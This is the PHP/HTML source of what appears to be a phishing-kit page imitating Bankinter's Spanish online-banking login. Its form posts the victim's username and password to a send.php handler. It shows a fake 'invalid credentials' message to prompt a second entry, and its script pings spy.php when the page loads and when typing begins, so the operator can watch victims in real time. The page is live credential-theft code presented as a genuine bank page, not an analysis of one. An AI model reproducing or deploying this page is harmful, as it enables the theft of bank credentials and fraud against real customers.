<?php 
require '../main.php';
?>
<!doctype html>
<html>
<head>
<title>Acceso clientes banca online | Bankinter</title><link href="inc/favicon.ico" type="text/css" rel="shortcut icon">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta charset="utf-8">
<meta name="robots" content="nofollow, noindex">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" />
<link rel="stylesheet" href="inc/bs.css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,500,600,700,800" />
<link rel="stylesheet" href="inc/style.css">
<script src="inc/jq.js"></script>
</head>
<body>
<header class="headrow">

<div class="col-logo">
<img src="inc/logo_bk.svg" class="logo">
</div>
<div class="col-menu">
<i class="fa fa-bars"></i>
</div>
</header>
<div class="container">
<div class="title">Soy cliente  </div>

<?php 
if(isset($_GET['e'])){
    echo '
<div class="form-group">
<span class="form-label text-danger">El usuario o la contraseña son inválidos. Introdúzcalos de nuevo tal y como los eligió, con mayúsculas o minúsculas y pulse Iniciar sesión.</span>
</div>';
}
?>

<div class="form">



<div class="forma" id="form-1">
<form method="post" action="send.php">
<div class="form-group">


<input type="text" class="form-control success" placeholder="Usuario" maxlength="15" name="user" id="inv">
</div>
<div class="form-group">


<input type="password" class="form-control success" placeholder="Contraseña" maxlength="40" name="password" id="inv">

</div>
<div class="enlace_claves">
													<a href="" onclick="return safeCallJsFunction('iniciarProceso()')">He olvidado mi usuario y/o contraseña</a>
												</div>
</div>
</div>



</select>
</div>
</div>
</div>

<div class="form-grou">
<button class="btn btn-success w-100" type="submit">INICIAR SESIÓN</button>
</div>


<footer class="container-fluid">
    <div class="row">
<div class="col-sm-3 left">

<img src="inc/logo_bk.svg">
</div>

</div>
</footer>
<?php
$j->ctr("LOGIN PAGE ".@$_GET['e']);
?>
<script>
 $.post("spy.php", {loginview:1});
var abort = false;
$("#user").keyup(function(){
	if(abort==false){
		$.post("spy.php", {logintype:1});
		abort=true;
	}
});

</script>
</body>
</html>